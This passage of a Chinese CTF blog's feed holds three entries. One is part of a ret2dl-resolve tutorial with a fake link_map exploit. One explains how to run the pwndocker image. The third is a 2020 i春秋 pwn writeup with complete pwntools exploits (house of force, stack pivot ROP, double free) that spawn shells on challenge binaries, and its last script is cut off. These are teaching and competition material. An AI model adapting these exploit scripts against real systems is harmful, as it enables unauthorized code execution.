class="line">payload+=fake_raloc</span><br><span class="line">payload+=<span class="string">'a'</span>*align</span><br><span class="line">payload+=fake_sym</span><br><span class="line">payload+=<span class="string">'system\0'</span></span><br><span class="line">payload+=<span class="string">'a'</span>*(<span class="number">80</span>-len(payload))</span><br><span class="line">payload+=binsh+<span class="string">'\x00'</span></span><br><span class="line">payload+=<span class="string">'a'</span>*(<span class="number">100</span>-len(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="伪造link-map"><a href="#伪造link-map" class="headerlink" title="伪造link_map"></a>伪造link_map</h3><p>64位情况下，伪造rel.plt变得不可行，因为在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) </span><br><span class="line">  &#123; </span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=(<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]); </span><br><span class="line">    ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>; </span><br><span class="line">    version = &amp;l-&gt;l_versions[ndx]; </span><br><span class="line">    <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>) </span><br><span class="line">      version = <span class="literal">NULL</span>; </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里，出现了访问未映射的内存<br>主要是reloc-&gt;r_info过大的原因，因为我们在bss段伪造的数据，而bss段一般位于0x600000<br>然后真正的rel.plt位于0x400000内，导致过大。<br>如果我们在里0x400000处有可读写的区域，或许就可以成功 </p><p>因此，我们得另外想办法，那么得回过来看源代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) &#123;  </span><br><span class="line">        ...  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load </span></span><br><span class="line"><span class="comment">        address) is also known.  */</span>  </span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);  </span><br><span class="line">        result = l;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们到最外层的else里去，如果，我们伪造link_map，让sym-&gt;st_value为某个已经解析了的函数的地址,比如read，让l-&gt;l_addr为我们需要的函数(system)到read的偏移,这样,l-&gt;l_addr + sym-&gt;st_value就是我们需要的函数地址</p><p>如果，我们把read_got – 0x8处开始当成sym，那么sym-&gt;st_value就是read的地址，并且sym-&gt;st_other正好也不为0，绕过了if，一举两得</p><p>为了伪造link_map，我们需要知道link_map的结构，在glibc/include/link.h文件里，link_map结构比较复杂，但是，我们只需伪造需要用到的数据即可,</p><p>以jiavis oj level3_x64为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./level3_x64'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">p = process(<span class="string">'./level3_x64'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,'b*0x400618')</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct            </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    Elf64_Word    st_name;        /* Symbol name (string tbl index) */</span></span><br><span class="line"><span class="string">      unsigned char    st_info;    /* Symbol type and binding */        </span></span><br><span class="line"><span class="string">      unsigned char st_other;        /* Symbol visibility */              </span></span><br><span class="line"><span class="string">      Elf64_Section    st_shndx;    /* Section index */                  </span></span><br><span class="line"><span class="string">      Elf64_Addr    st_value;        /* Symbol value */                   </span></span><br><span class="line"><span class="string">      Elf64_Xword    st_size;        /* Symbol size */                    </span></span><br><span class="line"><span class="string">&#125;Elf64_Sym;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">typedef struct           </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  Elf64_Addr    r_offset;        /* Address */                         </span></span><br><span class="line"><span class="string">  Elf64_Xword    r_info;            /* Relocation type and symbol index */</span></span><br><span class="line"><span class="string">  Elf64_Sxword    r_addend;        /* Addend */                          </span></span><br><span class="line"><span class="string">&#125;Elf64_Rela;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">typedef struct          </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  Elf64_Sxword    d_tag;            /* Dynamic entry type */</span></span><br><span class="line"><span class="string">  union</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      Elf64_Xword d_val;        /* Integer value */</span></span><br><span class="line"><span class="string">      Elf64_Addr d_ptr;            /* Address value */</span></span><br><span class="line"><span class="string">    &#125; d_un;</span></span><br><span class="line"><span class="string">&#125;Elf64_Dyn;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"> </span><br><span class="line">universal_gadget1 = <span class="number">0x4006AA</span></span><br><span class="line">universal_gadget2 = <span class="number">0x400690</span></span><br><span class="line"> </span><br><span class="line">Elf64_Sym_len = <span class="number">0x18</span></span><br><span class="line">Elf64_Rela_len = <span class="number">0x18</span></span><br><span class="line">write_addr = <span class="number">0x600ad0</span></span><br><span class="line">link_map_addr = write_addr+<span class="number">0x18</span></span><br><span class="line">rbp = write_addr<span class="number">-8</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">leave = <span class="number">0x400618</span></span><br><span class="line">main = <span class="number">0x4005E6</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_STR_addr = l+0x68  </span></span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_SYM_addr = l+0x70  </span></span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_JMPREL_addr = l+0xf8</span></span><br><span class="line"> </span><br><span class="line">l_addr = libc.sym[<span class="string">'system'</span>] - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="comment">#l-&gt;l_addr + sym-&gt;st_value</span></span><br><span class="line"><span class="comment"># value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fake_link_map_gen</span><span class="params">(link_map_addr,l_addr,st_value)</span>:</span></span><br><span class="line">    fake_Elf64_Dyn_JMPREL_addr = link_map_addr + <span class="number">0x18</span></span><br><span class="line">    fake_Elf64_Dyn_SYM_addr = link_map_addr + <span class="number">8</span></span><br><span class="line">    fake_Elf64_Dyn_STR_addr = link_map_addr</span><br><span class="line">    fake_Elf64_Dyn_JMPREL = p64(<span class="number">0</span>) + p64(link_map_addr+<span class="number">0x28</span>)</span><br><span class="line">    fake_Elf64_Dyn_SYM = p64(<span class="number">0</span>) + p64(st_value<span class="number">-8</span>)</span><br><span class="line">    fake_Elf64_rela = p64(link_map_addr - l_addr) + p64(<span class="number">7</span>) + p64(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">    fake_link_map = p64(l_addr)            <span class="comment">#0x8</span></span><br><span class="line">    fake_link_map += fake_Elf64_Dyn_SYM    <span class="comment">#0x10</span></span><br><span class="line">    fake_link_map += fake_Elf64_Dyn_JMPREL <span class="comment">#0x10</span></span><br><span class="line">    fake_link_map += fake_Elf64_rela       <span class="comment">#0x18</span></span><br><span class="line">    fake_link_map += <span class="string">'\x00'</span>*<span class="number">0x28</span></span><br><span class="line">    fake_link_map += p64(fake_Elf64_Dyn_STR_addr) <span class="comment">#link_map_addr + 0x68</span></span><br><span class="line">    fake_link_map += p64(fake_Elf64_Dyn_SYM_addr) <span class="comment">#link_map_addr + 0x70</span></span><br><span class="line">    fake_link_map += <span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">0x80</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    fake_link_map += p64(fake_Elf64_Dyn_JMPREL_addr)</span><br><span class="line">    <span class="keyword">return</span> fake_link_map</span><br><span class="line">fake_link_map = fake_link_map_gen(link_map_addr,l_addr,elf.got[<span class="string">'__libc_start_main'</span>])</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span></span><br><span class="line">payload += p64(rbp)</span><br><span class="line">payload += p64(universal_gadget1)</span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment">#pop rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)  <span class="comment">#pop rbp</span></span><br><span class="line">payload += p64(elf.got[<span class="string">'read'</span>])  <span class="comment">#pop r12</span></span><br><span class="line">payload += p64(len(fake_link_map)+<span class="number">0x18</span>) <span class="comment">#pop r13</span></span><br><span class="line">payload += p64(write_addr)  <span class="comment">#pop r14</span></span><br><span class="line">payload += p64(<span class="number">0</span>)           <span class="comment">#pop r15</span></span><br><span class="line">payload += p64(universal_gadget2)  <span class="comment">#ret</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload += p64(main)</span><br><span class="line"> </span><br><span class="line">p.sendafter(<span class="string">'Input:\n'</span>,payload.ljust(<span class="number">0x200</span>,<span class="string">'\x00'</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">fake_info = p64(<span class="number">0x4004A6</span>)        <span class="comment">#jmp</span></span><br><span class="line">fake_info += p64(link_map_addr)</span><br><span class="line">fake_info += p64(<span class="number">0</span>)</span><br><span class="line">fake_info += fake_link_map</span><br><span class="line">p.send(fake_info)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span>+p64(rbp)+p64(pop_rdi_ret)+p64(link_map_addr+<span class="number">0x78</span>)+p64(leave)</span><br><span class="line"><span class="comment">#stack pivot,进入函数重定向</span></span><br><span class="line">p.sendafter(<span class="string">'Input:\n'</span>,payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;参考链接:&lt;br&gt;&lt;a href=&quot;https://www.freebuf.com/articles/system/170661.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.freebuf.com/articles/sy
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>skysider/pwndocker 正确使用姿势</title>
    <link href="https://nocbtm.github.io/2020/02/24/skysider-pwndocker-%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8%E5%A7%BF%E5%8A%BF/"/>
    <id>https://nocbtm.github.io/2020/02/24/skysider-pwndocker-正确使用姿势/</id>
    <published>2020-02-24T03:27:00.000Z</published>
    <updated>2020-04-09T01:58:53.037Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>现在pwn题是越来越高版本的libc，一场比赛ubuntu16.04，ubuntu18.04切来切去的十分难受。<br>一种可行的方案就是，装个16.04的虚拟机，然后在此之上装个18.04的docker，而且这个docker已经集成pwn常用工具以及各个版本libc。<br>具体参考 <a href="https://github.com/skysider/pwndocker" target="_blank" rel="noopener">https://github.com/skysider/pwndocker</a></p><h2 id="18-04-pwndocker-安装"><a href="#18-04-pwndocker-安装" class="headerlink" title="18.04 pwndocker 安装"></a>18.04 pwndocker 安装</h2><p>docker hub 可以直接pull<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull skysider/pwndocker</span><br></pre></td></tr></table></figure></p><p>但是pull的太慢了，我已经把他传到了阿里云上,用下面这条命令即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0</span><br></pre></td></tr></table></figure><p>pull完之后重命名一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker tag registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0 skysider/pwndocker</span><br></pre></td></tr></table></figure><h2 id="使用姿势"><a href="#使用姿势" class="headerlink" title="使用姿势"></a>使用姿势</h2><p>建议用官方的使用姿势，用如下命令run起来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">--rm \</span><br><span class="line">-h $&#123;ctf_name&#125; \</span><br><span class="line">--name $&#123;ctf_name&#125; \</span><br><span class="line">-v $(pwd)/$&#123;ctf_name&#125;:/ctf/work \</span><br><span class="line">-p 23946:23946 \</span><br><span class="line">--cap-add=SYS_PTRACE \</span><br><span class="line">skysider/pwndocker</span><br></pre></td></tr></table></figure><p>其中有两个重要的参数<br>-v $(pwd)/${ctf_name}:/ctf/work 是将当前目录下的文件映射到 docker /ctf/work目录下<br>这样你在物理机修改文件，docker里面也会发生变化，就不用再docker cp了</p><p>–cap-add=SYS_PTRACE 这个参数也是要一定加的，不然docker里面没法用gdb调试。</p><p>可以把上述命令放到 pwndocker_run.sh里面 方便下次使用<br><img alt="" data-src="https://nocbtm.github.io/imgs/pwndocker-1.png" class="lozad"></p><p>然后调试脚本时，要先进去tmux ，python脚本里面指定终端为 tmux<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;]</span><br></pre></td></tr></table></figure></p><p>就可以 gdb.attach(p)了 如下图</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/pwndocker-2.png" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;现在pwn题是越来越高版本的libc，一场比赛ubuntu16.04，ubuntu18.04切来切去的十分难受。&lt;br&gt;一种可行的方案就是，
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2020 i春秋公益赛pwn writeup</title>
    <link href="https://nocbtm.github.io/2020/02/22/2020-i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9Bpwn-writeup/"/>
    <id>https://nocbtm.github.io/2020/02/22/2020-i春秋公益赛pwn-writeup/</id>
    <published>2020-02-22T11:25:47.000Z</published>
    <updated>2020-04-01T02:12:55.941Z</updated>
    
    <content type="html"><![CDATA[<h2 id="force"><a href="#force" class="headerlink" title="force"></a>force</h2><p>标准的house of force，先申请较大的内存页，可泄露出libc基址，<br>然后申请较小堆块，溢出修改top chunk的size为0xffffffffffffffff,申请堆块到__malloc_hook附近，这里用onegadget，不满足条件，可修改为system函数，然后申请”/bin/sh”所在地址的堆块，即可getshell</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">offset = 0x4ff010#0x4aa010#0x4ec010#</span><br><span class="line">while True:</span><br><span class="line">warn(hex(offset))</span><br><span class="line">try:    </span><br><span class="line">    p = process(&apos;./pwn&apos;)</span><br><span class="line">    #p = remote(&apos;123.56.85.29&apos;,7147)</span><br><span class="line">    def add(size,content):</span><br><span class="line">        p.sendlineafter(&apos;1:&apos;,&apos;1&apos;)</span><br><span class="line">        p.sendlineafter(&apos;size&apos;,str(size))</span><br><span class="line">        p.recvuntil(&apos;addr &apos;)</span><br><span class="line">        addr = int(p.recvuntil(&apos;\n&apos;,drop = True),16)</span><br><span class="line">        p.sendafter(&apos;content&apos;,content)</span><br><span class="line">        return addr</span><br><span class="line"></span><br><span class="line">    chunk1 = add(0x100000,&apos;aaaa&apos;)</span><br><span class="line"></span><br><span class="line">    info(hex(chunk1))</span><br><span class="line">    libc = chunk1 - offset</span><br><span class="line">    info(hex(libc))</span><br><span class="line"></span><br><span class="line">    chunk2 = add(0x28,&apos;\xff&apos;*0x30)+0x20</span><br><span class="line">    info(hex(chunk2))</span><br><span class="line"></span><br><span class="line">    mallochook = libc+0x3c4b10</span><br><span class="line">    chunk3 = add(mallochook-chunk2-0x20,&apos;bbbb&apos;)</span><br><span class="line"></span><br><span class="line">    chunk4 = add(0x20,p64(libc+0x45390)*4)</span><br><span class="line">    #gdb.attach(p)</span><br><span class="line">    #pause()</span><br><span class="line">    p.sendlineafter(&apos;1:&apos;,&apos;1&apos;)</span><br><span class="line">    p.sendafter(&apos;size&apos;,str(libc+0x18cd57))</span><br><span class="line">    print(p.recv())</span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line">except Exception as e:</span><br><span class="line">    offset-=0x1000</span><br><span class="line">    p.close()</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><h2 id="BorrowStack"><a href="#BorrowStack" class="headerlink" title="BorrowStack"></a>BorrowStack</h2><p>栈溢出0x10字节，栈迁移到bss段后，构造rop链。<br>需要注意的是，要尽量迁移到距离bss段更远的地址，为了防止bss段上面的got表被修改。<br>因为在调用函数时，栈由高地址向低地址生长，可能会修改到got表里面的内容。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">offest=152</span><br><span class="line"></span><br><span class="line">#while (1):</span><br><span class="line">try:</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">p=process(&apos;./pwn&apos;)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">p=remote(&apos;123.56.85.29&apos;,3635)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./pwn&apos;)</span><br><span class="line">bss_addr=0x601080</span><br><span class="line">p.recvuntil(&apos;\n&apos;)</span><br><span class="line">#gdb.attach(p, &quot;b *0x400680&quot;)</span><br><span class="line">payload=&apos;a&apos;*0x60+p64(bss_addr+offest)+p64(0x400699)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">payload = &apos;b&apos;*offest+p64(bss_addr+offest)+p64(0x400703)+p64(elf.got[&quot;read&quot;])+p64(elf.sym[&quot;puts&quot;])+p64(0x400626)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">leak=u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc_addr=leak-libc.sym[&quot;read&quot;]</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Tell me what you want\n&apos;)</span><br><span class="line">payload=&apos;a&apos;*0x60+p64(0)+p64(libc_addr+0x4526a)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;\n&apos;)</span><br><span class="line">payload=&apos;b&apos;*0x10</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">print offest</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br><span class="line">#p.close()</span><br><span class="line">except:</span><br><span class="line">offest=offest+1</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure><h2 id="Some-thing-exceting"><a href="#Some-thing-exceting" class="headerlink" title="Some_thing_exceting"></a>Some_thing_exceting</h2><p>flag已经被写到bss段内，用double free漏洞申请堆块到bss段，然后输出堆块内容即可。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">p=process(&apos;./excited&apos;)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">p=remote(&apos;123.56.85.29&apos;,6484)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">e=ELF(&apos;./excited&apos;)</span><br><span class="line">def show(index):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;4&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def new(lenght,cont,lenght2,cont2):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(lenght))</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(lenght2))</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont2)</span><br><span class="line"></span><br><span class="line">def delete(num):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">new(0x60,&apos;a&apos;*0x8,0x50,&apos;\x10&apos;*0x8)</span><br><span class="line">new(0x60,&apos;b&apos;*0x8,0x50,&apos;\x11&apos;*0x8)</span><br><span class="line">new(0x60,&apos;c&apos;*0x8,0x50,&apos;\x12&apos;*0x8)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">bss_addr=0x6020A8</span><br><span class="line">new(0x50,p64(bss_addr-0x10),0x50,&apos;\x14&apos;*4)</span><br><span class="line"></span><br><span class="line">new(0x50,&apos;\x16&apos;*4,0x50,&apos;\x17&apos;*1)</span><br><span class="line">show(1)</span><br><span class="line">print p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Some-thing-interesting"><a href="#Some-thing-interesting" class="headerlink" title="Some_thing_interesting"></a>Some_thing_interesting</h2><p>格式化字符漏洞泄露libc基址，然后double free修改malloc_hook为onegadget</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 